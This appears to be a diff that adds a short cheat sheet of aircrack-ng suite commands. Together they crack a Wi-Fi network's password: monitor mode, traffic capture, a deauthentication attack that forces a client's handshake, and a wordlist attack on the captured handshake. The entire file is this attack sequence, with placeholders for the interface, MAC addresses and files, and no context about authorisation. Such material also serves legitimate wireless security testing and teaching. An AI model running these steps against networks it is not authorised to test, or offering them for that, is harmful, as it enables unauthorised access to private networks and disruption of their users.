@@ -1,0 +1,7 @@
+$ airmon-ng start [WIRELESS INTERFACE]
+
+$ airodump-ng [WIRELESS INTERFACE]     -->   The interface name might have changed to [WIRELESS INTERFACE]mon. Example: wlan0mon
+
+$ aireplay-ng -0 1 -a [AP MAC ADDRESS] -c [CLIENT MAC ADDRESS]
+
+$ aircrack-ng -w [PATH TO WORDLIST].txt [PATH TO HASH FILE].cap
